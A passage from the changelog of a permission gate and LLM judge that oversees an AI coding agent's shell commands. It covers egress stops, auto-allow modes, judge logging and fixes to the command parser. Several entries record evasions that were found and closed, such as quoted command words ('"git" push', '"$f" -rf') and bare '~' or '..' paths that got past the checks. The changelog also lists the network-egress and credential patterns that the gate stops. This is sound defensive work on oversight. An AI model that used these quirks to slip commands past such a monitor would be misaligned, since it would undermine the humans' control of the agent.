  127.0.0.0/8 quads (octets ≤ 255), `::1` bare or [bracketed], or exact
  `localhost`.
- **Floor checks dequote command words** — the shell strips one quote pair,
  but the floor compared raw tokens: `"git" push`, `"ssh" host`, and
  `git "-C" dir push` evaded the egress stop, and `"$f" -rf` evaded the
  obscured-command check. First words (egress, obscured, package-run forms)
  are now dequoted; `findNetworkEgress`/`gitNetworkSubcommand` (shared with
  the packet annotation) get the same treatment.
- **FastAllow stops on bare location tokens** — the prefix checks missed
  `..` and word-initial `~`: `ls ..` and `du ~` auto-allowed although the
  full pipeline sees the parent / `$HOME` as outside. The tokens now fall
  through to the pipeline.
- **Bare `~` and `~user` join the path set** — `isPathCandidate` only
  accepted `~/…`, so `du ~` (a recursive `$HOME` read) and `ls ~nczer`
  auto-allowed in every layer while `ls /home/nczer` prompted. `expandTilde`
  resolves `~user` (current user → `os.homedir()`, other users →
  `/home/<user>` — conservative).

## 3.18.0 — 2026-09-06

`/dspa` persists across sessions; two cd-threading under-threads closed.

- **`/dspa` persists across sessions** — the toggle is stored in
  `settings-ext.json` (`halter.mode`, materialized alongside the judge
  and decision-log settings) and restored on `session_start` — restart
  and `/reload` both re-apply it (the toast says "restored from
  settings"). `/dspa` off clears it; `/dsp` (the full bypass) and
  `/dspat` (advisory) never touch the setting — a new session must never
  silently start with all checks skipped. Session-health counters stay
  session-scoped even when the mode persists; settings errors fail
  closed to manual.
- **A branch `cd` never recovers an unknown base** (analysis fix) — a
  conditional-branch cd (if/else/case body) may not have run, so it now
  threads only over a base that was already known. Pre-fix,
  `cd $D; if [ -f x ]; then cd /inbar; fi; cat y` resolved `y` against
  the in-bar target and auto-allowed, while at runtime (branch not run)
  the cwd is wherever `$D` points — an unflagged access. Known-pre-base
  threading (the `if [ -d ]`-then-cd pattern) and definite-cd recovery
  are untouched.
- **`&` after a `;` backgrounds the right list** (parser fix) — the
  compound-body rework moved `;` out of the operator set without
  advancing the `&` reach-back marker, so `a; b & c` backgrounded `a`
  instead of `b`: `a`'s cd was skipped in cwd threading (under-thread)
  while `b`'s (a subshell) threaded into the main base (over-thread).
  The marker now advances at every chain-start boundary and is scoped
  per container, so a body's `&` can no longer reach past its boundary.

## 3.17.0 — 2026-09-03

Judge packet: edits show the after-edit file view; infra failures are
diagnosable (docs/dspa-redesign.md, D11/D17 refinement).

- **Edits carry the after-edit view** — the judge packet for an edit is
  now the file WITH the replacements applied, each replaced region shown
  with ±10 context lines (line numbers, '>' marks the lines the edit
  sets), built from the pre-validation read the file handler already
  performs (non-credential, ≤1MB; otherwise the old newText join). The
  bare newText fragment read "truncated / non-self-contained" and forced
  a stage-2 pass — and a defer — on every safe edit.
- **`file exists` for all write ops** — the flag was probed only for
  `write`, so every edit packet said "file exists: no"; with session
  context showing the file being read, the judge deferred on the
  contradiction (2026-09-03 llama-link session). Edit packet wording:
  "modifies the existing file in place" (the replace warning stays a
  write thing).
- **Infra lines carry the sub-reason** — no-explanation judge failures
  log `detail` ("timeout" / "no-tool-call" / "bad-args: {…}" /
  "call-failed: <msg>"); thrown stream errors keep their message. The
  "stage 2 unavailable" prompt note and the on-demand-explain failure
  line now say what actually happened (no parseable verdict) instead of
  implying the model was unreachable.

## 3.16.0 — 2026-09-02

D17: /dspat runs both judge stages; always-on judge ledgers
(docs/dspa-redesign.md, D17).

- **/dspat runs BOTH stages, never skipping** — the same cascade order as
  /dspa, but stage 2 runs even on stage-1 approve+low. That cross-check is
  the data /dspa's auto-allow path cannot produce (a v1 approve+low
  auto-allow is checked by neither stage 2 nor the user). The prompt shows
  the FINAL verdict (stage 2, else stage 1) and records agreement stats
  against it; the widget line now says "judging stage N…".
- **New always-on judge ledger `.log/judge.jsonl`** (`logJudge`, signal
  lines only): `diff` (both stages rendered and disagree on approve or
  risk — /dspa wherever stage 2 ran, incl. the Judge-again retry, and
  /dspat always), `infra` (a stage produced no verdict: no-model /
  no-auth / no-explanation / call-failed — judge OFF stays silent),
  `paths` (D13 stage-2 path mismatches — now durable instead of lost when
  the decision log is off or wiped on /reload). Mine with
  `node tools/log-inspect.mjs judge` (rollups + listing).
- **Toggle split**: `/halter-decision-log` controls `decisions.jsonl` only.
  `.log/unresolved.jsonl` was previously gated by the same toggle (off by
  default) — the parser-convergence ledger was being lost in every default
  session. Both ledgers are now always-on with test-only env seams
  (`HALTER_UNRESOLVED_LOG=off`, `HALTER_JUDGE_LOG=off`; the vitest worker
  setup forces all three logs off).

## 3.15.0 — 2026-09-02

Every /dspa floor stop is advisory (docs/dspa-redesign.md, D16).

- A floor stop no longer prompts bare: the judge runs both stages and its
  verdict renders in the prompt ("— advisory (floor stop stands)"), the
  same flow the untrusted-package, egress, and outside-base stops already
  had. The stop stands — the judge never grants over the floor.
- Covers the formerly bare stops: rm carve-out failures (glob/variable
  targets, bare rm, stdin rm, cwd-as-target, `--no-preserve-root`,
  un-cleaned self-writes), rm-neighborhood danger (`cp … && rm …`
  file-modification patterns), unparseable commands, obscured command
  positions, credential patterns (bash and file), full-filesystem scans,
  and the tool file/consent gate stops (reason reworded to `tool <gate>
  never auto-allows (session grants cover its repetition)`).
- Still never judged: policy-level auto-allows that never prompt (reads of
  permitted paths, payload-less commands, session-granted writes) and
  anything under judge OFF (no latency, no verdict).

## 3.14.0 — 2026-09-01

DSPA widget line: compact session-health counts (a g r c d) replace
"auto-allowed N this session".

- The DSPA line now renders the session tally compactly, non-zero only,
  in stop-source order: `79a 3g 2r 1c 2d` — `a` auto-allowed, `g` floor
  stop, `r` judge REJECT, `c` approve-but-above-authority (declined),
  `d` DEFER or no verdict (the fail-safe bucket). `last: <target>` stays
  as the tail detail (dropped first on narrow terminals, as before).
- Stops are recorded at the single fall-through point
  (`tryDspaAutoAllow` in gate.ts); counters are model-scoped like the
  auto-allow count (a model switch resets all; a verdict-less floor stop
  never resets).
- Observational precursor to the D4 3/20 reject-escalation (Phase 3b,
  still unimplemented) — see the D4 addendum in docs/dspa-redesign.md.

## 3.13.0 — 2026-09-01

Package trust becomes the ONLY grant for fetchable run forms; the
manager-prefix option is gone (docs/dspa-redesign.md, D10 addendum).

- **Fetchable forms (`npx tsc`, `uvx tsc`, `npm exec tsc` …) are granted
  by `Trust: <pkg> (session)` only** — in every mode. Their signatures
  drop out of the command tier and its rules (a mix like `npx tsc &&
  npm test` still offers `Always: npm test *` for the non-fetchable part),
  and the Trust option now appears on plain manual prompts too, not just
  the /dspa untrusted-package stop.
- **Removed: `Always: npx <pkg> *` and the manager-prefix tier (`npx *`,
  `npm *`, …)** from all prompts. The prefix tier would auto-allow ANY
  registry package for the rest of the session, and signature grants
  short-circuit `decide()` before the /dspa floor is consulted.
- The /dspa untrusted-package stop carries no `untrustedPackages` field
  anymore — the prompt derives its Trust option from the decision's own
  analysis (`BashPromptData.fetchableForms`), the same one the gate saw.
- Non-fetchable package-manager commands (`npm test`, `npm run …`) are
  unchanged: exact-form `Always` grant, no broader tier.

## 3.12.0 — 2026-08-31

Parser resolution of script bodies and loop in-lists — the three
"unresolvable" shapes from the 2026-08-31 log now resolve statically
(docs/dspa-redesign.md, D15).

- **Script-body paths join the path set (fail-closed).** Path-like
  literals in heredoc bodies and multi-line literal args (`python3 -
  << 'EOF' … open('/var/lib/…') … EOF`, `node -e '…'`) are extracted and
  checked like any shell argument — the script's filesystem access is
  floor-visible from the first run, not only to the judge. URLs and
  single-segment noise stay excluded.
- **Glob-tailed values bind to their directory.** A glob never matches `/`,
  so `F=/a/b; grep $F/*.js` resolves to `/a/b` (before: the `*` in the
  token's own tail voided the binding → `runtime location unresolvable`).
  Applies to quoted and substituted values; brace expansion stays a
  sentinel (several names, one value).
- **Literal-path loop in-lists name every word.** `for d in /a /b; do ls
  "$d"; done` now resolves to the concrete dirs (before: one sentinel per
  iteration — Always-for-dir could never apply, and every run re-prompted).
  A word containing `$`, a glob, or `..` keeps the marker; a
  symlink-escaping word names its real target (still outside, never
  exempt).

## 3.11.0 — 2026-08-31

One status widget: mode lines pinned on top, one line each.

- **Merged the mode widgets into the halter status widget.** pi renders
  same-placement widgets in set order (a re-set moves a widget to the end),
  so the separate `dspa`/`dspat`/`dsp-warning` widgets floated below the
  session-rules lines after every rules update. All halter UI is now ONE
  widget (`widget.ts`), top to bottom: the DSP warning (alone — rules are
  noise while everything is bypassed), the DSPA line, the DSPAT line, then
  the `Bash:`/`R:`/`R/W:`/`Pkg:`/`Cwd:`/`Tools:` rules. Legacy widget ids
  are cleared on every update (a same-process /reload can't leave stale
  duplicates).
- **Each mode line is now ONE line.** `» DSPA (model): auto-allowed N this
  session — last: <target>` and `◎ DSPAT: judge advises… — M/N agreed —
  last: <disagreement>`. On narrow terminals the details drop from the tail
  first (last-target, then counter) before the line itself truncates — no
  over-width lines, the bottom bar is one row shorter per mode.

## 3.10.0 — 2026-08-31

Network egress is LLM-reviewed; prompt ergonomics (docs/dspa-redesign.md,
D14).

- **Loopback egress is judgeable (D14).** A curl/wget command whose every
  URL in the text is loopback-hosted (127.0.0.0/8, ::1, localhost) is no
  longer a floor stop — the two-stage judge decides on the full text. A
  local call cannot exfiltrate off the machine; the 2026-08-31 log had 8
  floor prompts for Joplin-API probes at 127.0.0.1. Fail-closed: no URL at
  all (`curl "$B"`), a variable host (`http://$HOST/x`), a mixed loopback +
  external list, bracketed IPv6, and every non-URL egress form (ssh/scp/nc,
  git push, package fetch, docker/aws/…) keep the stop.
- **Other egress stops are advisory (D14).** The judge runs both stages and
  its verdict renders in the fall-through prompt ("— advisory (floor stop
  stands)") — approve an informed verdict on intended egress. The stop
  stands: egress is never auto-allowed. Credential/parse/obscured/rm stops
  stay bare.
- **The floor-stop line leads the prompt.** `🚧 DSPA: not auto-allowed —
  <reason>` used to trail the body — off-screen on long prompts, so the
  stop was guessed from latency. It now leads.
- **Chain listings are capped.** Above 8 segments the prompt lists only the
  ⚠️-flagged (approval-requiring) segments — a 30-echo chain no longer
  renders 30 lines (a chain with none flagged gets a head/tail sample).
- **Nonexistent reads auto-allow.** A read whose resolved path does not
  exist can only ENOENT — nothing can leak — so it no longer prompts in any
  mode. Warned (credential-pattern) paths keep prompting (no fs probe on
  credential paths); writes are unaffected.

## 3.9.0 — 2026-08-27

Judge path report: the stage-2 verdict now reports the paths the operation
touches, cross-checked against the deterministic floor — logged, not
enforced (docs/dspa-redesign.md, D13).

- **Stage-2 path report (no new LLM calls).** The existing stage-2 judge
call additionally reports `paths` — every filesystem path the operation
reads, writes, creates, or deletes (absolute, shell-expanded, including
script payloads). A reported path the static list doesn't cover and the
judge can't explain is a hidden effect → deny/defer per the judge's own
rules (advisory, as always). Stage 1 is unchanged (eval-locked prompt).
- **Deterministic cross-check (`judge-paths.ts`).** The report is
sanitized (sentinels dropped, ~ expanded, relatives resolved against
cwd, deduped, capped at 8); a path is covered by the floor's own
knowledge — analysis paths, outside list, confirmed dirs, cwd — when it
equals or lies under a floor path (or under a GLOB floor path).
Uncovered = a miss. The floor is never fed LLM output — a hallucinated
path cannot stop an auto-allow.
- **Decision log.** Lines whose final verdict is stage 2 (auto-allow and
fall-through alike) carry `judgePaths` (sanitized report) and
`judgePathMisses` (capped at 5). Nothing in the gate reads them back —
each miss is a static-parser gap to fix (the D7–D12 mining workflow) or
a hallucination (reliability data for the field).
- **`log-inspect.mjs dspa --paths`** — lists mismatch entries (report,
misses, stop tag, target); the summary and `dspa --reasons` count them.
- **Mode widgets: the DSP style.** The dspa/dspat widgets drop the color
emoji (⚡/👁) for text-default glyphs — `» DSPA` (auto-pass-through) and
`◎ DSPAT` (advisory watcher) — and the names go all-caps like `DSP`
(widgets, toasts, prompt note lines). While a judge call is in flight the
separate "⏳ Judge: explaining…" widget is gone: the status folds into
the active mode's own line (`» DSPA (model): auto-allowed N this session
— judging…` / `◎ DSPAT — judging…: judge advises …`). Manual mode's
on-demand Explain keeps the standalone widget.

## 3.8.0 — 2026-08-27

Converge: repeated operations with unresolvable path tokens reach a
deterministic steady state (docs/dspa-redesign.md, D12).

- **Tier 0 (parser, no prompt at all)**
  - Pinned-tail refs `prefix/$var/tail` are judged by their static prefix:
    prefix inside the read bar → the ref is dropped entirely (no marker,
    no prompt). `grep … ~/.pi/agent/extensions/$e/*.ts` now auto-allows.
  - Multi-line literal arguments without runtime expansion (`node -e
    '<script>'`, `python3 -c "…"`) are script bodies, not paths: no opaque
    ref, no bogus outside dir. The command is judged on its own risk.
  - `outsideDirs` no longer lists a token's marker-derived static prefix
    (a grant of it could never satisfy the marker and is unsound — an
    unbound value can contain `..`); the unknown-cwd marker stays.
- **Tier 1 (LLM path resolver, first run only)**
  - `path-resolver.ts`: one judge-model call (same settings as the judge)
    reports the runtime dirs per unresolved token; the prompt shows
    `→ LLM: dir1, dir2` under the token. Advisory — the gate never
    auto-allows on it. LRU-cached on model + command bytes; any failure
    → no lines (the prompt looks as before).
- **Steady state (confirmed resolutions)**
  - `store.confirmResolution(token, dirs)` — session-scoped, consulted at
    the analysis layer so the manual bar and the dspa gate agree (one
    derivation, deterministic — no LLM):
    - the raw text of an unbound token is **not a location** — it no
      longer joins the approval bar (it kept `needsPathApproval` true even
      after an in-bar confirmation, so the manual bar re-prompted a
      resolved token forever);
    - all confirmed dirs in the manual bar → the token leaves the bar →
      the command auto-allows like any in-bar one;
    - any confirmed dir outside → named as a concrete outside path: the
      gate stops `touches paths outside base (…)` carrying
      `confirmedOutside`, and "Always (paths)" grants exactly it — one
      click converges the token.
  - Persisted on Always / Always (paths) (all resolutions); on one-shot
    Yes / non-paths Always only all-in-bar tokens.
  - The "Always (paths)" grant covers the union of concrete outside dirs
    and the resolver dirs (`pathGrantDirs`) — exactly what the option
    label names.
- **Observability**
  - `.log/unresolved.jsonl` (`logUnresolved`): one line per unresolved
    token — `outcome: prompted | gate-stop | auto-allowed`, LLM
    suggestion, user decision, confirmed flag. Same toggle
    (/halter-decision-log) and 5 MiB rotation;
    `HALTER_DECISION_LOG=off` disables it too.
  - Prompt bodies and log summaries shorten long tokens (60 chars).
